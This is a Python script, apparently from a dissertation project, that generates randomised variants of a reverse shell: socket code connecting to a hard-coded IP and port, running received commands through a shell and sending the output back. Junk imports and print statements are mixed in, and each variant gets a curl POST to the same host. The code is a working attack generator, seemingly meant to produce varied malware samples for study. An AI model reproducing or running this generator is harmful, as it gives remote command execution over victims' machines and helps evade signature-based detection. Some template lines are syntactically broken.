import random
import hashlib

gene_sequence = []
return_string = ''
place = 'placeholders' 
holders = 'for decorator' 
workaround = 'arguments hack'


def reseed(val=None):
    if val==None:
        random.seed()
    else:
        random.seed(val)
        

def unpacker(func, *args, **kwargs):
    '''takes in a function that contains a list/s (up to a 2D aaray) 
    and then processes the list/s into a return string. Intended to 
    be used as a decorator.
    '''
    # try:
    global gene_sequence
    global return_string
    return_string = ''
    gene_array = []
    # print(f"This is the call: {func}\n\tArgs calls: {args}\n\tKwargs calls: {kwargs}")
    if args or kwargs:
        # print(f"We're inside the callable feature!!")
        def func_wrap(func):
            # print("inside func_wrap")
            def wrapper(*args, **kwargs):
                # print("I am inside wrapper")
                choices = func(*args, **kwargs)
                global return_string
                return_string = ''
                for i in choices:
                    if type(i) is list:
                        var = int(random.randrange(len(i)) )
                        return_string = return_string + str(i[var])
                        gene_array.append(var)
                        # print(f'list selection: {var}\n')
                        # print(f'return string so far: {return_string}\n')
                    elif type(i) is str:
                        return_string += i
                # print("I am leaving wrapper")
                # print(f'choices = {choices}')
                return(return_string)
            # print(choices)
            # print(f'wrapper = {wrapper}')
            return(wrapper)
        # print(choices)
        # print(f'func_wrap = {func_wrap}')
        return(func_wrap)
    else:
        # print(f'we had no arguments!!')
        choices = func()
    # except:
    #     print("Something went wrong in the wrapper!!")  
    try:           
        # print(f'about to do something with choices: {choices}\n')
        for i in choices:
            if type(i) is list:
                var = int(random.randrange(len(i)) )
                return_string = return_string + str(i[var])
                gene_array.append(var)
                # print(f'list selection: {var}\n')
                # print(f'return string so far: {return_string}\n')
            elif type(i) is str:
                return_string += i
        gene_sequence.append(gene_array)
        if gene_array is not None:
            return(return_string)
        else:
            return(return_string)
    except:
        print("Something went wrong in the unpacker!!")


def combiner(*args:list) -> list:
    '''built to take in lists as args and concatinates them
    together to create a long list. Typically to be passed 
    to the unpacker to create a long string to create a file
    from. 
    args: <- type(list)
    choices: -> echoed throughout the code -> type(list)
    '''
    if not args: return
    choices = []
    for i in args:
        if type(i) is callable:
            choices + [i()]
        elif type(i) is str:
            choices += [i]
        else:
            choices.extend(i)
    # print(f"Choices return: {choices}")
    return(choices)


def random_bad_imports() -> list:
    choices = [
        "import zlib\n",
        "import gzip\n",
        "import bz2\n",
        "import lzma\n",
        "import zipfile\n",
        "import tarfile\n",
        "import hashlib\n",
        "import hmac\n",
        "import threading\n",
        "import crypt\n", 
    ]
    r = random.randint(1, len(choices))
    x = random.sample(choices, k=r)
    gene_seed(choices, x)
    return(x)
    

def print_the_bad():
    choices = [
        "print('this is bad!!!')\n",
        "print('this is bad bad!!!')\n",
        "print('this is bad bad bad!!!')\n",
        "print('this is super bad bad!!!')\n",
        "print('this is bad the worst bad!!!')\n",
    ]
    r = random.randint(1, len(choices))
    x = random.sample(choices, k=r)
    gene_seed(choices, x)
    return(x)


def imports (good_bad_choice: list, requirements: list) -> list:
    choices = good_bad_choice + requirements
    random.shuffle(choices)
    return(choices)    


# TODO This only handles a single case, it must be improved
def nested(list_to_nest) -> list:
    list_to_nest = list_to_nest.split('\n')
    # print(list_to_nest)
    temp = ['\t' + i + '\n' for i in list_to_nest]
    # list_to_nest = 
    # 
    # for i in list_to_nest:
    #     # print(i)
    #     temp.append(''.join('\t',[i]))
    # print(temp)
    return(temp)


@unpacker
def infinite_loops():
    choices = [
        'while 1:\n',
        'for i in range(100000):\n',
        'while not False:\n',
        'while True:\n',
        'while 1 == 1:\n',
        'while 1 != 2:\n',
        'while True != False:\n',
        'while False != True:\n',
        'while 1 != False:\n',
        'while 0 != True:\n',
        'while type("foo") is not int:\n',
        'while type(1) is not str:\n'
    ]
    # choices = [random.choice(choices)]  ## random.choice moved to unpacker
    return([choices])


@unpacker(place, holders)
def non_infinite_loops(passed, count = 1, upperlimit = 6) -> list:
    """ Takes in a list and two integers, then creates a list edited 
    with these positional arguments. 
    """
    assert(count < upperlimit), "upper limit is lower than counter!!" 
    count = int(count)
    upperlimit = int(upperlimit)
    choices = [
        f"count = {count}\n",
        [
            f'while {count} < {upperlimit}:\n',
            f'for i in range({upperlimit}):\n',
            f'while {upperlimit} > {count}:\n',
            f'while {count} == True && {count} < {upperlimit}:\n',
            f'while {count} is True && {count} < {upperlimit}:\n'
        ],
        f"{''.join(str(i)for i in passed)}",
        [
            'count ++',
            'count += 1',
            'count -= -1',
            'count = count + 1',
            'count = count - -1',
            'count = count - (2 - 3)',
            'count = count + (3 - 2)'
        ]
    ]
    # print(choices)
    return(choices)
    # else: 
    #     print("non-integer values were passes to non_infinite_loops variable")


@unpacker(place, holders)
def reverse_shell(ip, port) -> list:
    required_imports = ['import socket\n', 'import subprocess\n', 'import os\n']
    required_components = [
        'def reverse_shell():\n',
        '\ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n',
        f'\ts.connect(("{ip}",{port}))\n'
        ]
    required_nests = [
        '\t\tcommand = s.recv(1024).decode("utf-8")\n',
        '\t\tif not command: break\n',
        '\t\tdata = subprocess.check_output(command, shell=True)\n',
        '\t\ts.send(data)\n'
    ]
    choices = combiner(
        imports(random_bad_imports(),required_imports), 
        print_the_bad(),
        required_components,
        '\t' + infinite_loops,
        required_nests
        )
    return(choices)


def wrapper(ip, port):
    global gene_sequence
    x = reverse_shell(ip, port)
    x += f"x = \'gene_sequence: {gene_sequence}\'\n"
    x += f"os.system(\"curl -d 'gene_sequence: {gene_sequence}' -X POST {ip}:{port}\")\n"
    y = hashlib.md5(x.encode("ascii")).hexdigest()
    x += f"y = \'hash_check: {y}\'\n"
    gene_sequence = [] #gene_sequence has been imbedded so zero out for multiple iterations
    return x


def gene_seed(choices, selection):
    global gene_sequence
    temp = []
    for i in choices:
        for j in selection:
            if i == j:
                temp.append(choices.index(j))
    gene_sequence.append(temp)


def originality_check(hash_to_check, counter=0) -> bool:
    filename = "/home/buzzki11/Dissertation/brain/mount/filehashes2.txt"
    # print(hash_to_check)
    if counter == 0:
        with open(filename, 'w+') as file:
            file.write(f'{hash_to_check}\n')
            return(True)
    else: 
        with open(filename, 'r+') as file:
            for line in file:
                if hash_to_check in line:
                    return(False)
                else:
                    file.write(f'{hash_to_check}\n')
                    return(True)


if __name__ == "__main__":
    """Writing test code here 
    """
    # print("############################################################")
    # print("### Running tests                                        ###")
    # print("############################################################")
    
    print("############################################################")
    print("### actual output program                                ###")
    print("############################################################")
    # x = wrapper("175.20.0.200", "8080")
    # y = x.encode("ascii")
    # print(y)
    # y = str(hashlib.md5(x.encode("ascii")).hexdigest())
    # y = '52eb5fa0c63355140232a2692bf06205'
    # print(y)
    from sys import argv
    if len(argv) == 2:
            for i in range(0, int(argv[1])):
                x = wrapper("175.20.0.200", "8080")
                # print(x)
                y = str(hashlib.md5(x.encode("ascii")).hexdigest())
                originality_check(y, i)
    else:
        x = wrapper("175.20.0.200", "8080")
        # print(x)
        y = str(hashlib.md5(x.encode("ascii")).hexdigest())
        originality_check(y)

    print("############################################################")
    print("### end string                                           ###")
    print("############################################################")